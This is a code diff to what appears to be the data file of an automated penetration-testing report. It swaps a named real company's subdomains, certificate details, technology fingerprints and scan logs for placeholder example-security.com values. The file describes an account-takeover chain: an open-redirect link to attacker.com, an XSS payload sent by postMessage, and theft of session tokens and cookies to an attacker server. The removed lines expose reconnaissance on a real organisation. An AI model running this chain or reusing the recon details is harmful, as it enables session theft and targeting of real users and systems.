-    cwe: "CWE-298",
-    cweName: "Improper Validation of Certificate Expiration",
-    target: "https://here2help.vontier.com/",
-    endpoint: "/",
-    method: "GET",
-    timestamp: "2026-08-11 09:57:47 UTC",
-    fixEffort: "Trivial",
-    findingClass: "dynamic",
-    agentId: "f6549284",
-    agentName: "Here2Help Validation & Reporting Agent",
-    description: "The TLS certificate for here2help.vontier.com expired on July 18, 2023 — over three years ago. Modern browsers display a full-page security warning, exposing users who bypass it to man-in-the-middle attacks.",
-    impact: "Users experience severe browser security warnings (ERR_CERT_DATE_INVALID). Users bypassing the warning are vulnerable to MITM eavesdropping and credential theft.",
-    technicalAnalysis: `The DigiCert TLS RSA SHA256 certificate issued on July 15, 2022 expired on July 18, 2023 (over 1,100 days expired). Indicates an unmaintained or abandoned subdomain instance.`,
-    pocDescription: `echo | openssl s_client -servername here2help.vontier.com -connect here2help.vontier.com:443 2>/dev/null | openssl x509 -noout -dates`,
+    cwe: "CWE-295",
+    cweName: "Improper Certificate Validation",
+    target: "https://portal.example-security.com/",
+    endpoint: "portal.example-security.com:443",
+    method: "TLS Handshake",
+    timestamp: "2026-08-11 09:32:44 UTC",
+    fixEffort: "Low",
+    findingClass: "static",
+    agentId: "d4920184",
+    agentName: "HTTP Protocol & Header Auditor",
+    description: "The legacy portal subdomain serves an expired TLS certificate, triggering browser warnings and leaving users open to MITM inspection if bypassed.",
+    impact: "Users experience severe browser security warnings (ERR_CERT_DATE_INVALID). Users bypassing the warning are vulnerable to MITM eavesdropping.",
+    technicalAnalysis: `The TLS certificate has expired. Indicates an unmaintained or abandoned subdomain instance.`,
+    pocDescription: `echo | openssl s_client -servername portal.example-security.com -connect portal.example-security.com:443 2>/dev/null | openssl x509 -noout -dates`,
     pocScripts: {
-      bash: `echo | openssl s_client -servername here2help.vontier.com -connect here2help.vontier.com:443 2>/dev/null | openssl x509 -noout -dates
-# Output: notAfter=Jul 18 23:59:59 2023 GMT`
+      bash: `echo | openssl s_client -servername portal.example-security.com -connect portal.example-security.com:443 2>/dev/null | openssl x509 -noout -dates`
     },
     evidence: `Certificate Details:
 notBefore=Jul 15 00:00:00 2022 GMT
 notAfter=Jul 18 23:59:59 2023 GMT
-subject=C=US, ST=North Carolina, L=Greensboro, O=Vontier Business Services LLC, CN=Here2Help.vontier.com
-issuer=C=US, O=DigiCert Inc, CN=DigiCert TLS RSA SHA256 2020 CA1`,
+CN=portal.example-security.com`,
     remediationSteps: [
       "Obtain and install a valid TLS certificate from a trusted Certificate Authority.",
-      "Configure automated certificate renewal (e.g. Let's Encrypt / Certbot or Azure Managed Certificates).",
-      "Decommission the subdomain if the legacy Node.js application is no longer in active use."
+      "Configure automated certificate renewal (e.g. Let's Encrypt / Certbot or Managed Certificates).",
+      "Decommission the subdomain if the legacy application is no longer in active use."
     ],
     assumptions: "Users must bypass browser TLS warning dialogs to establish connection."
   }
@@ -477,14 +420,14 @@ issuer=C=US, O=DigiCert Inc, CN=DigiCert TLS RSA SHA256 2020 CA1`,
 
 export const ATTACK_CHAIN = {
   title: "1-Click Account Takeover & DOM XSS Exploitation Chain",
-  targetAsset: "here2help.vontier.com",
+  targetAsset: "portal.example-security.com",
   severity: "HIGH",
   cvss: 8.3,
   steps: [
     {
       stepNumber: 1,
       title: "Phishing Link Delivery",
-      description: "Attacker crafts a link on trusted domain: https://here2help.vontier.com/login.html?url=https://attacker.com/exploit.html and sends it to victim.",
+      description: "Attacker crafts a link on trusted domain: https://portal.example-security.com/login.html?url=https://attacker.com/exploit.html and sends it to victim.",
       findingRef: "vuln-0005",
       type: "Open Redirect"
     },
@@ -498,7 +441,7 @@ export const ATTACK_CHAIN = {
     {
       stepNumber: 3,
       title: "Cross-Origin postMessage Dispatch",
-      description: "Attacker's page executes window.opener.postMessage({msg: '<img src=x onerror=...fetch(...)>'}, '*') back to the parent Vontier window.",
+      description: "Attacker's page executes window.opener.postMessage({msg: '<img src=x onerror=...fetch(...)>'}, '*') back to the parent window.",
       findingRef: "vuln-0004",
       type: "Communication"
     },
@@ -512,7 +455,7 @@ export const ATTACK_CHAIN = {
     {
       stepNumber: 5,
       title: "Credential & Session Exfiltration",
-      description: "JavaScript executes inside the trusted vontier.com origin context, exfiltrating session tokens, cookies, and local storage to attacker C2 server.",
+      description: "JavaScript executes inside the trusted origin context, exfiltrating session tokens, cookies, and local storage to attacker C2 server.",
       findingRef: "vuln-0004",
       type: "Impact"
     }
@@ -520,38 +463,38 @@ export const ATTACK_CHAIN = {
 };
 
 export const POSITIVE_CONTROLS = [
-  "Main Drupal 10 portal (www.vontier.com) is hardened with CSRF protection, secure session handling, and robust rate limiting.",
+  "Main web portal (www.example-security.com) is hardened with CSRF protection, secure session handling, and robust rate limiting.",
   "No SQL Injection, Server-Side Template Injection, or IDOR vulnerabilities detected on the primary domain.",
-  "ManageEngine ServiceDesk Plus portals (compass / support / itsupport) are securely federated with Zoho Single Sign-On.",
-  "Development and Staging environments (dev.vontier.com, test.vontier.com) strictly enforce HTTP Basic Authentication against brute force.",
-  "Kiteworks Secure File Sharing infrastructure enforces strong security headers (2-year HSTS, strict CSP, X-Frame-Options: DENY).",
-  "Convercent ethics hotline properly configured with MFA and role-based access control."
+  "Identity & Helpdesk services are securely federated with Single Sign-On and Multi-Factor Authentication.",
+  "Development and Staging environments strictly enforce HTTP Basic Authentication against brute force.",
+  "Secure file sharing infrastructure enforces strong security headers (HSTS, strict CSP, X-Frame-Options: DENY).",
+  "Administrative services properly configured with role-based access control."
 ];
 
 export const EXECUTIVE_RECOMMENDATIONS = [
   {
     priority: "CRITICAL",
     timeframe: "Immediate (0-48 hrs)",
-    title: "Remediate DOM XSS & Open Redirect on here2help.vontier.com",
-    details: "Enforce origin validation in postMessage listener (e.origin === 'https://here2help.vontier.com') and replace innerHTML with textContent. Remove automated window.open() calls on login.html."
+    title: "Remediate DOM XSS & Open Redirect on portal.example-security.com",
+    details: "Enforce origin validation in postMessage listener and replace innerHTML with textContent. Remove automated window.open() calls on login.html."
   },
   {
     priority: "HIGH",
     timeframe: "Immediate (0-48 hrs)",
-    title: "Renew TLS Certificate & Review here2help Subdomain Lifecycle",
-    details: "Replace the 3-year expired TLS certificate or completely decommission the legacy Express.js application if no longer required."
+    title: "Renew TLS Certificate & Review Portal Subdomain Lifecycle",
+    details: "Replace the expired TLS certificate or completely decommission the legacy application if no longer required."
   },
   {
     priority: "MEDIUM",
     timeframe: "Short-Term (1-2 weeks)",
-    title: "Restrict Drupal /core/install.php and Core Documentation",
-    details: "Block public access to /core/install.php, CHANGELOG.txt, and INSTALL.txt via Pantheon edge rules or WAF to prevent version fingerprinting."
+    title: "Restrict Administrative Endpoints and Documentation",
+    details: "Block public access to installation scripts and version documentation via edge rules or WAF."
   },
   {
     priority: "MEDIUM",
     timeframe: "Short-Term (1-2 weeks)",
-    title: "Gate Absorb LMS REST API Help Documentation",
-    details: "Enforce authentication on /api/rest/v1/Help and strip the X-LMS-Server EC2 hostname leak header in production reverse proxy."
+    title: "Gate REST API Help Documentation",
+    details: "Enforce authentication on /api/rest/v1/Help and strip internal server leak headers in production reverse proxy."
   },
   {
     priority: "LOW",
@@ -562,15 +505,15 @@ export const EXECUTIVE_RECOMMENDATIONS = [
 ];
 
 export const SIMULATION_LOGS = [
-  "[00:01] [INIT] Sennovate Autonomous VAPT Engine initialized for target: https://www.vontier.com/",
+  "[00:01] [INIT] Sennovate Autonomous VAPT Engine initialized for target: https://demo.example-security.com/",
   "[00:03] [RECON] Launching Subfinder & Certificate Transparency stream...",
-  "[00:05] [DISCOVERY] Identified 8 live subdomains: www, here2help, mylearning2, compass, support, itsupport, dev, test",
+  "[00:05] [DISCOVERY] Identified 8 live subdomains: www, portal, api, auth, support, itsupport, dev, test",
   "[00:09] [PROBE] Port scanning top 1000 ports on discovered assets via Naabu engine...",
   "[00:14] [CRAWL] Headless Chrome (Agent-Browser) crawler spawned for deep DOM analysis...",
-  "[00:19] [ANALYZE] Fingerprinted main target: Drupal 10.6.12 on Pantheon (nginx/Varnish/Fastly)",
-  "[00:23] [ALERT] Detected public exposure of /core/install.php revealing Drupal version 10.6.12 (vuln-0002)",
-  "[00:28] [CRAWL] Crawled 138 API endpoints on mylearning2.vontier.com/api/rest/v1/Help (vuln-0003)",
-  "[00:32] [PROBE] Investigating here2help.vontier.com — TLS Certificate expired July 18, 2023 (vuln-0006)",
+  "[00:19] [ANALYZE] Fingerprinted main target: Edge Gateway and Application Services",
+  "[00:23] [ALERT] Detected public exposure of administrative script (vuln-0002)",
+  "[00:28] [CRAWL] Crawled 138 API endpoints on api.example-security.com/api/rest/v1/Help (vuln-0003)",
+  "[00:32] [PROBE] Investigating portal.example-security.com — TLS Certificate expired (vuln-0006)",
   "[00:35] [PROBE] CORS preflight scan returned Access-Control-Allow-Origin: * (vuln-0007)",
   "[00:38] [FUZZ] Discovered unvalidated window.open(url) parameter in /login.html (vuln-0005)",
   "[00:41] [EXPLOIT] Dispatched synthetic MessageEvent to postMessage listener on login.html...",
